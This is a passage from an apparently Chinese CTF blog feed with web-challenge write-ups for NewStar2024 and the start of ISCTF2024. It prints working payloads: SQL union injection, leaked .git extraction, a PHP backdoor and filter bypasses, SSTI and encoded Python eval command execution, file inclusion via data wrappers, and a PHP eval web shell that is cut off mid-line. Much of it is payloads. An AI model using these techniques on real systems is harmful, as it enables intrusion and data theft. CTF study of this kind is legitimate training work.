&#x2F;flag</p><p>base64_cmd：Y2F0IC9mbGFn</p><p>reversed_base64_cmd：nFGbm9CI0F2Y</p><p>hashed_reversed_base64_cmd：879a591c6785a4e1398b96a9a1bc67eb</p><p>base64_hashed_reversed_base64_cmd：ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI&#x3D;</p></blockquote><p>然后post“cmd&#x3D;Y2F0IC9mbGFn&amp;key&#x3D;ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI&#x3D;”</p><p><img src="/2025/05/23/NewStar2024-web/zxwj.png"></p><h3 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h3><p>一个简单的联合注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,<span class="hljs-keyword">database</span>()#查库<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctf&#x27;</span>#查表<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;Fl4g&#x27;</span>#查字段<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> des,<span class="hljs-keyword">value</span> <span class="hljs-keyword">from</span> ctf.Fl4g#拿flag<br></code></pre></td></tr></table></figure><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="PangBai过家家（2）"><a href="#PangBai过家家（2）" class="headerlink" title="PangBai过家家（2）"></a>PangBai过家家（2）</h3><p>根据提示，用dirsearch扫一下目录，发现可以扫到.git目录</p><p>用githacker从.git文件夹中泄露文件到本地</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">githacker</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://192.168.5.40:52701/.git&quot;</span> <span class="hljs-built_in">--output-folder</span> <span class="hljs-string">pangbai2</span><br></code></pre></td></tr></table></figure><p>进入对应文件夹，使用git log查看提交历史，并没有什么发现</p><p>查看Stash（git stash：临时保存工作区中未提交的修改）</p><p><img src="/2025/05/23/NewStar2024-web/pangbai2_1.png"></p><p>发现后门，git stash pop恢复后门文件到工作区</p><p><img src="/2025/05/23/NewStar2024-web/pangbai2_2.png"></p><p>发现后门文件BacKd0or.vubjeVv3GZwDWHK3.php，直接查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># Functions to handle HTML output</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print_msg</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>) </span>&#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/\s*&lt;script.*&lt;\/script&gt;/s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/ event/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;点击此处载入存档&#x27;</span>, <span class="hljs-variable">$msg</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_backdoor</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/assets/index.4f73d116116831ef.js&#x27;</span>, <span class="hljs-string">&#x27;/assets/backdoor.5b55c904b31db48d.js&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-comment"># Backdoor</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;papa&#x27;</span>] !== <span class="hljs-string">&#x27;doKcdnEOANVB&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">show_backdoor</span>();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai loves you!&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;args&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai hates you!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>能否成功进行rce关键点在于第二个判断为真</p><p>首先是参数名NewStar_CTF.2024中存在特殊字符，如果直接进行传参php会默认将其解析为NewStar_CTF_2024，这一点我们可以使用“[”字符的非正确替换漏洞</p><blockquote><p>在php7中，当传入的参数中出现“[”，但是没有”]”时，php会将“[”这个字符替换为“_”，但此后就不会继续替换后面出现的特殊字符</p></blockquote><p>参数名传NewStar[CTF.2024</p><p>其次是传入参数值的问题，传入的值既要不等于Welcome，又要等于Welcome，了解到</p><blockquote><p>preg_match()该函数默认为单行模式，而php在该模式下，“$”除了能够匹配字符串的结尾，还能匹配字符串最后一个换行符</p><p>但如果加修饰符D，不能匹配最后一个换行符，e.g.preg_match(‘&#x2F;^Welcome$&#x2F;D’, $str)</p></blockquote><p>参数值传Welcome%0a</p><p>至于call_user_func()第一个传命令执行函数system，第二个参数传要执行的命令env（查看当前的环境变量）</p><p><img src="/2025/05/23/NewStar2024-web/pangbai2_3.png"></p><h3 id="你能在一秒内打出八句英文吗"><a href="#你能在一秒内打出八句英文吗" class="headerlink" title="你能在一秒内打出八句英文吗"></a>你能在一秒内打出八句英文吗</h3><p>写一个python脚本，建立连接后获取id为text的p标签内容，然后在&#x2F;submit路由以post的方式作为user_input提交并将响应打印</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">session</span> = requests.<span class="hljs-keyword">Session</span>()<br><br>response = <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(&quot;http://192.168.5.40:59257/start&quot;)<br>html_content = response.text<br><br>soup = BeautifulSoup(html_content, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>element = soup.find(<span class="hljs-string">&#x27;p&#x27;</span>, id=<span class="hljs-string">&#x27;text&#x27;</span>)<br><span class="hljs-keyword">value</span> = element.get_text()<br><br>submit_response = <span class="hljs-keyword">session</span>.post(<br>    &quot;http://192.168.5.40:59257/submit&quot;,<br>    data=&#123;<span class="hljs-string">&#x27;user_input&#x27;</span>: <span class="hljs-keyword">value</span>&#125;<br>)<br><br>print(submit_response.text)<br></code></pre></td></tr></table></figure><h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h3><p>简单的ssti</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.os.popen</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="谢谢皮蛋plus"><a href="#谢谢皮蛋plus" class="headerlink" title="谢谢皮蛋plus"></a>谢谢皮蛋plus</h3><h3 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h3><p>dirsearch进行目录扫描，发现<a href="http://www.zip,访问下载到本地,解压得到pizwww.php的源码/">www.zip，访问下载到本地，解压得到pizwww.php的源码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//for fun</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;star&#x27;</span>])&#123;<br>        <span class="hljs-comment">//欸 为啥sha1和md5相等呢</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|flag/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;u can not do this &quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong&quot;</span>;<br><br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>采用数组绕过，sha1与md5的值都为null，满足相等条件</p><p><img src="/2025/05/23/NewStar2024-web/ysdll.png"></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="Include-Me"><a href="#Include-Me" class="headerlink" title="Include Me"></a>Include Me</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&lt;|\?|php|&gt;|echo|filter|flag|system|file|%|&amp;|=|`|eval/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;me&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;兄弟你别包&quot;</span>);<br>    &#125;;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><br><span class="hljs-comment">//兄弟你知道了吗？</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;iknow&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&quot;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">waf</span>();<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;me&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;兄弟你好香&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入参数iknow防跳转</p><p>可以data伪协议+base64直接打</p><p><img src="/2025/05/23/NewStar2024-web/include1.png"></p><blockquote><p>这里需要注意的是如果base64加密后出现等号，应该将等号删除因为会被waf，或则也可以采用向明文后加1-2个空格使加密结果不带等号</p><p>如果加密后字符结尾为‘+’的话，那应该将其编码为%2B，因为当表单使用application&#x2F;x-www-form-urlencoded编码方式时，空格会编码为‘+’，那么浏览器或服务器会默认将‘+’解析为空格，而非‘+’本身</p></blockquote><h3 id="blindsql1"><a href="#blindsql1" class="headerlink" title="blindsql1"></a>blindsql1</h3><h3 id="臭皮的计算机"><a href="#臭皮的计算机" class="headerlink" title="臭皮的计算机"></a>臭皮的计算机</h3><p>进入&#x2F;calc路由，查看网页源码，发现后端python代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> flask import Flask, render_template, request<br>import uuid<br>import subprocess<br>import os<br>import tempfile<br><br>app = Flask(__name__)<br>app.secret_key = str(uuid.uuid4())<br><br>def waf(s):<br>    token = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:<br>            token = <span class="hljs-literal">False</span><br>            break<br>    return token<br><br>@app.route(<span class="hljs-string">&quot;/&quot;</span>)<br>def index():<br>    return render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br>@app.route(<span class="hljs-string">&quot;/calc&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>])<br>def calc():<br>    <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        num = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;num&quot;</span>)<br>       <span class="hljs-built_in"> script </span>= f<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;import os</span><br><span class="hljs-string">print(eval(&quot;&#123;num&#125;&quot;))</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(script)<br>        <span class="hljs-keyword">if</span> waf(num):<br>            try:<br>                result_output = <span class="hljs-string">&#x27;&#x27;</span><br>                with tempfile.NamedTemporaryFile(<span class="hljs-attribute">mode</span>=<span class="hljs-string">&#x27;w+&#x27;</span>, <span class="hljs-attribute">suffix</span>=<span class="hljs-string">&#x27;.py&#x27;</span>, <span class="hljs-attribute">delete</span>=<span class="hljs-literal">False</span>) as temp_script:<br>                    temp_script.write(script)<br>                    temp_script_path = temp_script.name<br><br>                result = subprocess.<span class="hljs-built_in">run</span>([<span class="hljs-string">&#x27;python3&#x27;</span>, temp_script_path], <span class="hljs-attribute">capture_output</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">text</span>=<span class="hljs-literal">True</span>)<br>                os.<span class="hljs-built_in">remove</span>(temp_script_path)<br><br>                result_output = result.stdout <span class="hljs-keyword">if</span> result.returncode == 0 <span class="hljs-keyword">else</span> result.stderr<br>            except Exception as e:<br><br>                result_output = str(e)<br>            return render_template(<span class="hljs-string">&quot;calc.html&quot;</span>, <span class="hljs-attribute">result</span>=result_output)<br>        <span class="hljs-keyword">else</span>:<br>            return render_template(<span class="hljs-string">&quot;calc.html&quot;</span>, <span class="hljs-attribute">result</span>=<span class="hljs-string">&quot;臭皮！你想干什么！！&quot;</span>)<br>    return render_template(<span class="hljs-string">&quot;calc.html&quot;</span>, <span class="hljs-attribute">result</span>=<span class="hljs-string">&#x27;试试呗&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.<span class="hljs-built_in">run</span>(<span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-attribute">port</span>=30002)<br></code></pre></td></tr></table></figure><p>过滤了所有字母，利用八进制进行rce，编码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入要编码的字符串: &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&#x27;\\<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(c):03o&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> user_input))<br></code></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust">payload：__import__(<span class="hljs-symbol">&#x27;o</span>s<span class="hljs-string">&#x27;).popen(&#x27;</span>cat /flag<span class="hljs-string">&#x27;).read()</span><br><span class="hljs-string">编码后：<span class="hljs-char escape_">\1</span>37<span class="hljs-char escape_">\1</span>37<span class="hljs-char escape_">\1</span>51<span class="hljs-char escape_">\1</span>55<span class="hljs-char escape_">\1</span>60<span class="hljs-char escape_">\1</span>57<span class="hljs-char escape_">\1</span>62<span class="hljs-char escape_">\1</span>64<span class="hljs-char escape_">\1</span>37<span class="hljs-char escape_">\1</span>37<span class="hljs-char escape_">\0</span>50<span class="hljs-char escape_">\0</span>47<span class="hljs-char escape_">\1</span>57<span class="hljs-char escape_">\1</span>63<span class="hljs-char escape_">\0</span>47<span class="hljs-char escape_">\0</span>51<span class="hljs-char escape_">\0</span>56<span class="hljs-char escape_">\1</span>60<span class="hljs-char escape_">\1</span>57<span class="hljs-char escape_">\1</span>60<span class="hljs-char escape_">\1</span>45<span class="hljs-char escape_">\1</span>56<span class="hljs-char escape_">\0</span>50<span class="hljs-char escape_">\0</span>47<span class="hljs-char escape_">\1</span>43<span class="hljs-char escape_">\1</span>41<span class="hljs-char escape_">\1</span>64<span class="hljs-char escape_">\0</span>40<span class="hljs-char escape_">\0</span>57<span class="hljs-char escape_">\1</span>46<span class="hljs-char escape_">\1</span>54<span class="hljs-char escape_">\1</span>41<span class="hljs-char escape_">\1</span>47<span class="hljs-char escape_">\0</span>47<span class="hljs-char escape_">\0</span>51<span class="hljs-char escape_">\0</span>56<span class="hljs-char escape_">\1</span>62<span class="hljs-char escape_">\1</span>45<span class="hljs-char escape_">\1</span>41<span class="hljs-char escape_">\1</span>44<span class="hljs-char escape_">\0</span>50<span class="hljs-char escape_">\0</span>51</span><br></code></pre></td></tr></table></figure><p>官方wp还有一种做法：使用全角字符和字符拼接进行rce</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_</span>＿ｉｍｐｏｒｔ_＿(ｃｈｒ(<span class="hljs-number">111</span>)+ｃｈｒ(<span class="hljs-number">115</span>)).ｓｙｓｔｅｍ(ｃｈｒ(<span class="hljs-number">99</span>)+ｃｈｒ(<span class="hljs-number">97</span>)+ｃｈｒ(<span class="hljs-number">116</span>)+ｃｈｒ(<span class="hljs-number">32</span>)+ｃｈｒ(<span class="hljs-number">47</span>)+ｃｈｒ(<span class="hljs-number">102</span>)+ｃｈｒ(<span class="hljs-number">108</span>)+ｃｈｒ(<span class="hljs-number">97</span>)+ｃｈｒ(<span class="hljs-number">103</span>))<br></code></pre></td></tr></table></figure><h3 id="臭皮踩踩背"><a href="#臭皮踩踩背" class="headerlink" title="臭皮踩踩背"></a>臭皮踩踩背</h3><h3 id="这「照片」是你吗"><a href="#这「照片」是你吗" class="headerlink" title="这「照片」是你吗"></a>这「照片」是你吗</h3><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="Pangbai-过家家（4）"><a href="#Pangbai-过家家（4）" class="headerlink" title="Pangbai 过家家（4）"></a>Pangbai 过家家（4）</h3><h3 id="blindsql2"><a href="#blindsql2" class="headerlink" title="blindsql2"></a>blindsql2</h3><h3 id="chocolate"><a href="#chocolate" class="headerlink" title="chocolate"></a>chocolate</h3><h3 id="ezcmsss"><a href="#ezcmsss" class="headerlink" title="ezcmsss"></a>ezcmsss</h3><h3 id="ezpollute"><a href="#ezpollute" class="headerlink" title="ezpollute"></a>ezpollute</h3><h3 id="隐藏的密码"><a href="#隐藏的密码" class="headerlink" title="隐藏的密码"></a>隐藏的密码</h3><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="PangBai-过家家（5）"><a href="#PangBai-过家家（5）" class="headerlink" title="PangBai 过家家（5）"></a>PangBai 过家家（5）</h3><h3 id="ez-redis"><a href="#ez-redis" class="headerlink" title="ez_redis"></a>ez_redis</h3><h3 id="sqlshell"><a href="#sqlshell" class="headerlink" title="sqlshell"></a>sqlshell</h3><h3 id="臭皮吹泡泡"><a href="#臭皮吹泡泡" class="headerlink" title="臭皮吹泡泡"></a>臭皮吹泡泡</h3><h3 id="臭皮的网站"><a href="#臭皮的网站" class="headerlink" title="臭皮的网站"></a>臭皮的网站</h3>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF2024_WEB复现</title>
    <link href="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br><span class="hljs-comment">#一句话木马，神神又奇奇</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$call</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br>    <span class="hljs-variable">$dangerous_commands</span> = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;tac&#x27;</span>, <span class="hljs-string">&#x27;head&#x27;</span>, <span class="hljs-string">&#x27;nl&#x27;</span>, <span class="hljs-string">&#x27;more&#x27;</span>, <span class="hljs-string">&#x27;less&#x27;</span>, <span class="hljs-string">&#x27;tail&#x27;</span>, <span class="hljs-string">&#x27;vi&#x27;</span>, <span class="hljs-string">&#x27;sed&#x27;</span>, <span class="hljs-string">&#x27;od&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dangerous_commands</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$command</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$command</span>/i&quot;</span>, <span class="hljs-variable">$call</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这些个危险函数可不兴使啊&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$call</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>题目过滤了一些读文件的命令</p><p>先ls &#x2F;，发现&#x2F;f14g目录</p><p>拿flag的话，这里就直接贴一些payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">J=ca&#x27;&#x27;t /f14g</span><br><span class="language-xml"></span><br><span class="language-xml">J=strings /f14g</span><br><span class="language-xml"></span><br><span class="language-xml">J=tar -czf flag.tar.gz /f14g# 将/f14g文件打包为flag.tar.gz文件，访问下载即可</span><br><span class="language-xml"></span><br><span class="language-xml">J=cp /f14g flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">J=echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span 